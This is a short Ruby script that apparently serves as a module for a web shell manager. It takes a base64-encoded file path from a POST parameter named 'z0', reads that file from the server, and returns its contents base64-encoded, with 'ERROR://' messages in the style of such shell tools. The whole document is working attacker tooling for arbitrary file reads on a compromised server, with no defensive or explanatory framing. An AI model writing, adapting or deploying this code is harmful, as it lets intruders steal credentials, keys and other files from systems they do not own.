# $_POST: global variable used by the Ruby loader

require 'base64'

def main
  sz_file_path = Base64.decode64($_POST['z0'].to_s)
  if !File.exist?(sz_file_path) || !File.file?(sz_file_path)
    print 'ERROR://Unable to open file!'
    return
  end

  begin
    file_data = File.read(sz_file_path, mode: 'rb')
    print Base64.strict_encode64(file_data)
    return
  rescue => e
    print 'ERROR://Unable to open file!'
    return
  end
end

main()